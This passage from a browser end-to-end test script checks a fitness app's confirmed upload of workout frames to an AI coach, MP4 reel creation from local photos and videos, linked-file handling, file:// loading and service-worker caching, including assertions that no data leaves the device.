    await lpage.evaluate(() => App.setKey('sk-ant-test-0000000000', 'typed'));
    const before = await mediaKinds();
    await videoTile().click();
    const sheet = lpage.locator('#sheets');
    const [fc] = await Promise.all([lpage.waitForEvent('filechooser'), sheet.getByRole('button', { name: 'Ask the coach about form' }).click()]);
    await fc.setFiles(lfiles[1]);
    await sheet.getByText(/pictures go to api\.anthropic\.com/).waitFor();
    eq(await sheet.locator('.framestrip img').count(), 6);
    eq(lai.length, 0, 'nothing sent before the person confirms');
    await sheet.getByLabel('Exercise').fill('Bench press');
    await sheet.getByRole('button', { name: 'Send 6 pictures' }).click();
    await sheet.getByText(/mid-foot/).waitFor();
    eq(lai.length, 1);
    const body = lai[0];
    const content = body.messages[body.messages.length - 1].content;
    eq(content.filter((c) => c.type === 'image').length, 6, 'six images');
    ok(content.every((c) => c.type !== 'image' || c.source.media_type === 'image/jpeg'), 'JPEG frames');
    ok(content[0].text.includes('Bench press'), 'exercise named');
    await sheet.getByRole('button', { name: /Save with this video/ }).click();
    await lpage.waitForFunction(() => Store.getState().clips.some((c) => c.review && /mid-foot/.test(c.review)));
    eq(await mediaKinds(), before, 'the frames were not stored');
    eq(await lpage.evaluate(() => Store.getState().clips.length), 2);
    await closeAll();
  });

  await step('form check: cancelling at the confirmation sends nothing', async () => {
    const n = lai.length;
    await lpage.locator('.libtile', { hasNot: lpage.locator('.dur') }).first().click();
    const sheet = lpage.locator('#sheets');
    const [fc] = await Promise.all([lpage.waitForEvent('filechooser'), sheet.getByRole('button', { name: 'Ask the coach about form' }).click()]);
    await fc.setFiles(lfiles[0]);
    await sheet.getByRole('button', { name: 'Send 1 picture' }).waitFor();
    await sheet.getByRole('button', { name: 'Cancel' }).click();
    await lpage.waitForTimeout(200);
    eq(lai.length, n);
    await closeAll();
  });

  const recordable = await lpage.evaluate(() => !!MediaOut.pickVideoMime());
  const reelDone = async (label) => {
    const sheet = lpage.locator('#sheets');
    await sheet.locator('video.resmedia').waitFor({ timeout: 60000 });
    const v = await sheet.locator('video.resmedia').evaluate((el) => new Promise((res) => { const f = () => res({ w: el.videoWidth, h: el.videoHeight, d: el.duration, e: el.error && el.error.message }); el.readyState >= 1 ? f() : (el.onloadedmetadata = f, el.onerror = f); }));
    ok(!v.e, label + ' plays: ' + v.e);
    return v;
  };

  await step('reel: choose items, find the originals by name and size, stitch photos and video into one MP4', async () => {
    if (!recordable) { console.log('       (this browser cannot record MP4; skipped)'); return; }
    await route(lpage, '#/library');
    const eventsBefore = await lpage.evaluate(() => Store.getEvents().length), kindsBefore = await mediaKinds();
    await lpage.getByRole('button', { name: 'Make a reel' }).click();
    const sheet = lpage.locator('#sheets');
    await sheet.getByText('The saved file shows your photos unblurred').waitFor();
    await sheet.getByRole('radio', { name: '1 s', exact: true }).click();
    await sheet.getByRole('radio', { name: '2 s', exact: true }).click();
    await sheet.getByRole('switch', { name: 'Weekly check-in photos' }).click();
    ok(/4 items/.test(await sheet.getByRole('status').last().innerText()), 'summary counts 2 library items and 2 check-ins: ' + await sheet.getByRole('status').last().innerText());
    await sheet.getByRole('button', { name: 'Continue' }).click();
    await sheet.getByText('Where are the originals?').waitFor();
    eq(await sheet.getByText('Needed', { exact: true }).count(), 2);
    // only the photo is picked this time: it matches, the video is still needed
    const [fc] = await Promise.all([lpage.waitForEvent('filechooser'), sheet.getByRole('button', { name: /Choose the files/ }).click()]);
    await fc.setFiles(lfiles[0]);
    await sheet.getByText('Needed', { exact: true }).waitFor();
    eq(await sheet.getByText('Found', { exact: true }).count(), 1);
    await sheet.getByRole('button', { name: 'Leave out the missing ones' }).waitFor();
    // a file that is not one of the items matches nothing
    const [fc2] = await Promise.all([lpage.waitForEvent('filechooser'), sheet.getByRole('button', { name: 'Choose the file' }).click()]);
    await fc2.setFiles({ name: 'other.mp4', mimeType: 'video/mp4', buffer: Buffer.from([0, 0, 0, 0]) });
    await lpage.locator('#toasts, .toast').getByText(/None of those matched/).first().waitFor();
    const [fc3] = await Promise.all([lpage.waitForEvent('filechooser'), sheet.getByRole('button', { name: 'Choose the file' }).click()]);
    await fc3.setFiles(lfiles[1]);
    await sheet.getByText('All the originals were found').waitFor();
    await sheet.getByRole('button', { name: 'Create the reel' }).click();
    await sheet.getByRole('progressbar').waitFor();
    const v = await reelDone('reel');
    eq([v.w, v.h], [1080, 1920]);
    // title 2 s + 2 check-ins 1 s + photo 1 s + video 1.9 s
    ok(v.d > 5.5 && v.d < 9.5, 'about 7 seconds: ' + v.d);
    const dl = lpage.waitForEvent('download');
    await sheet.getByRole('button', { name: /Download file|Save or share/ }).first().click();
    const d = await dl;
    ok(/^orbit-reel-\d{4}-\d{2}-\d{2}\.mp4$/.test(d.suggestedFilename()), 'file name: ' + d.suggestedFilename());
    const mp4 = fs.readFileSync(await d.path());
    ok(mp4.length > 1000, 'not empty');
    eq(mp4.subarray(4, 8).toString('latin1'), 'ftyp', 'a real MP4 container, not WebM');
    await sheet.getByRole('button', { name: 'Done' }).click();
    eq(await lpage.evaluate(() => Store.getEvents().length), eventsBefore, 'the reel changed nothing that is stored');
    eq(await mediaKinds(), kindsBefore, 'and stored no video');
  });

  await step('reel: cancelling while it records returns to the choices', async () => {
    if (!recordable) return;
    await lpage.getByRole('button', { name: 'Make a reel' }).click();
    const sheet = lpage.locator('#sheets');
    await sheet.getByRole('radio', { name: '2.5 s', exact: true }).click();
    await sheet.getByRole('button', { name: 'Continue' }).click();
    const [fc] = await Promise.all([lpage.waitForEvent('filechooser'), sheet.getByRole('button', { name: /Choose the files/ }).click()]);
    await fc.setFiles(lfiles);
    await sheet.getByRole('button', { name: 'Create the reel' }).click();
    await sheet.getByRole('progressbar').waitFor();
    await sheet.getByRole('button', { name: 'Cancel' }).click();
    await sheet.getByRole('button', { name: 'Continue' }).waitFor();
    await closeAll();
  });

  await step('reel plan: title card, photos, and the middle part of a long video; files match by name and size', async () => {
    const r = await lpage.evaluate(() => {
      const items = [{ type: 'photo' }, { type: 'video', dur: 10 }, { type: 'video', dur: 1.5 }, { type: 'video', dur: 0 }];
      const segs = Reel.segments(items, { photoSec: 1.5, clipSec: 4, title: 'T' });
      const f = (n, size) => ({ name: n, size });
      const m = Library.match([f('a.mov', 5), f('b.mov', 6), f('c.mov', 7)], [{ id: 'x', name: 'a.mov', size: 5 }, { id: 'y', name: 'b.mov', size: 99 }, { id: 'z', name: 'c.mov', size: 7 }]);
      return { types: segs.map((x) => x.type), ms: segs.map((x) => x.ms), start: segs[2].start, total: Reel.secondsOf(items, { photoSec: 1.5, clipSec: 4, title: 'T' }), none: Reel.secondsOf(items, { photoSec: 1.5, clipSec: 4, title: '' }), matched: Array.from(m.keys()) };
    });
    eq(r.types, ['title', 'photo', 'video', 'video', 'video']);
    eq(r.ms, [2000, 1500, 4000, 1500, 4000]);
    eq(r.start, 3, 'a 10 s video shows seconds 3 to 7');
    eq([r.total, r.none], [13, 11]);
    eq(r.matched, ['x', 'z'], 'same name but a different size is not the same file');
  });

  await step('library and reel: nothing left the device, no console problems', async () => {
    eq(loutside, [], 'requests to other origins');
    eq(await lpage.evaluate(() => document.querySelectorAll('video').length), 0, 'no video element left behind');
    eq(lproblems.filter((p) => !/Failed to load resource/.test(p)), [], 'console problems');
  });
  await lctx.close();

  // ---- the same on a computer in Chrome or Edge, where the browser can keep a real link to each file (here: files in the browser's private file system) ----
  const kctx = await browser.newContext({ viewport: { width: 390, height: 844 } });
  await kctx.addInitScript(() => {
    window.showOpenFilePicker = async () => { const r = await navigator.storage.getDirectory(); const out = []; for (const n of ['IMG_0001.jpg', window.__vname]) { try { out.push(await r.getFileHandle(n)); } catch (e) { /* not there */ } } return out; };
  });
  const kpage = await kctx.newPage(); kpage.setDefaultTimeout(8000);
  const kproblems = await collect(kpage);
  await kpage.goto(base);
  await kpage.waitForSelector('text=Track the change.');
  await step('linked files (Chrome, Edge): a saved link opens the original and the reel without asking again, and removing an item drops the link', async () => {
    await kpage.evaluate(async ({ photo, video, vname }) => {
      window.__vname = vname;
      const start = Engine.addDays(U.today(), -14);
      const a = { sex: 'male', age: 31, heightCm: 180, weightKg: 82, units: { body: 'kg', length: 'cm', lift: 'lb' }, measurements: { waist: 86, chest: 100 }, goal: 'recomp', days: [1, 2, 3, 4, 5], startDate: start,
        training: { split: 'auto', dbStep: 2.5, machineStep: 5, sets: 3, repStyle: 'mixed', deload: 'planned' }, lifts: [{ id: 'flat_db_press', on: true, weight: 40, reps: 8 }] };
      await Store.append('profile_created', { profile: a, plan: Engine.buildPlan(a) });
      await Store.saveSettings({ bodyUnit: 'kg', lenUnit: 'cm', liftUnit: 'lb', onboardedAt: new Date().toISOString(), blurPhotos: false });
      const r = await navigator.storage.getDirectory();
      for (const [n, bytes] of [['IMG_0001.jpg', photo], [vname, video]]) { const f = await r.getFileHandle(n, { create: true }); const w = await f.createWritable(); await w.write(new Uint8Array(bytes)); await w.close(); }
      location.hash = '#/library'; App.render();
    }, { photo: fx.photo, video: fx.video, vname: lfiles[1].name });
    await kpage.waitForSelector('text=Your workout photos and videos');
    ok(await kpage.evaluate(() => Library.canLink()), 'links are available');
    await kpage.getByRole('button', { name: 'Add photos or videos' }).click();
    await kpage.locator('#sheets').getByRole('button', { name: 'Add', exact: true }).click();
    await kpage.waitForSelector('.libtile');
    eq(await kpage.locator('.libtile').count(), 2);
    ok(/folders? on this computer|their folders on this computer/.test(await kpage.locator('#screen').innerText()), 'the wording says the originals stay in their folders');
    eq(await kpage.evaluate(() => Store.getState().clips.filter((c) => c.linked).length), 2, 'both keep a link');
    await kpage.reload();
    await kpage.waitForSelector('.libtile');
    await kpage.locator('.libtile').first().click();
    await kpage.locator('#sheets').getByRole('button', { name: /View the original|Watch the original/ }).click();
    await kpage.locator('#sheets .resmedia').last().waitFor();
    ok(/Opened from the file on this computer/.test(await kpage.locator('#sheets').innerText()), 'opened through the link, with no picker');
    await kpage.locator('#sheets').getByRole('button', { name: 'Close' }).last().click();
    if (recordable) {
      await kpage.locator('#sheets').getByRole('button', { name: 'Save' }).click();
      await kpage.getByRole('button', { name: 'Make a reel' }).click();
      const sheet = kpage.locator('#sheets');
      await sheet.getByRole('radio', { name: '1 s', exact: true }).click();
      await sheet.getByRole('button', { name: 'Continue' }).click();
      await sheet.getByText('All the originals were found').waitFor();
      await sheet.getByRole('button', { name: 'Create the reel' }).click();
      await sheet.locator('video.resmedia').waitFor({ timeout: 60000 });
      await sheet.getByRole('button', { name: 'Done' }).click();
    } else await kpage.locator('#sheets').getByRole('button', { name: 'Save' }).click();
    const ids = await kpage.evaluate(() => Store.getState().clips.map((c) => c.id));
    for (const i of ids) ok(await kpage.evaluate((x) => Store.getMeta('clip_h_' + x).then((m) => !!m), i), 'link stored for ' + i);
    await kpage.locator('.libtile').first().click();
    await kpage.locator('#sheets').getByRole('button', { name: 'Remove' }).click();
    await kpage.locator('#sheets').getByRole('button', { name: 'Remove' }).last().click();
    await kpage.waitForFunction(() => Store.getState().clips.length === 1);
    const left = await kpage.evaluate(() => Store.getState().clips[0].id), gone = ids.find((i) => i !== left);
    eq(await kpage.evaluate((x) => Store.getMeta('clip_h_' + x).then((m) => !!m), gone), false, 'link dropped with the item');
    ok(await kpage.evaluate((x) => Store.getMeta('clip_h_' + x).then((m) => !!m), left), 'the other link is kept');
    eq(kproblems.filter((p) => !/Failed to load resource/.test(p)), [], 'console problems');
  });
  await kctx.close();

  // ================= file:// =================
  console.log('\nApp from file://');
  const fctx = await browser.newContext({ viewport: { width: 390, height: 844 } });
  const fpage = await fctx.newPage();
  fpage.setDefaultTimeout(5000);
  const fproblems = await collect(fpage);
  await fpage.goto('file://' + path.join(ROOT, 'index.html'));
  await step('file:// loads, onboards and keeps data (IndexedDB works on file URLs)', async () => {
    await fpage.waitForSelector('text=Track the change.');
    await onboard(fpage);
    eq(await fpage.evaluate(() => Store.getState().plan.goal), 'recomp');
    eq(fproblems.filter((p) => !/Failed to load resource/.test(p)), [], 'console problems on file://');
  });
  await fctx.close();

  // ================= service worker on localhost =================
  console.log('\nService worker');
  const sctx = await browser.newContext();
  const spage = await sctx.newPage();
  await spage.goto(base);
  await step('service worker registers on localhost and caches the shell', async () => {
    await spage.waitForFunction(() => navigator.serviceWorker && navigator.serviceWorker.controller || navigator.serviceWorker.ready.then(() => true), null, { timeout: 8000 });
    await spage.waitForTimeout(800);
    const keys = await spage.evaluate(async () => { const ks = await caches.keys(); const c = await caches.open(ks[0]); return (await c.keys()).length; });
    ok(keys >= 20, 'cached ' + keys + ' files');
  });
  await sctx.close();

  await browser.close(); srv.close();
  fs.rmSync(tmp, { recursive: true, force: true });
  console.log('\n' + passed + ' passed, ' + failures.length + ' failed');
  if (failures.length) { console.log(failures.map((f) => ' - ' + f).join('\n')); process.exit(1); }
}
main().catch((e) => { console.error(e); process.exit(1); });
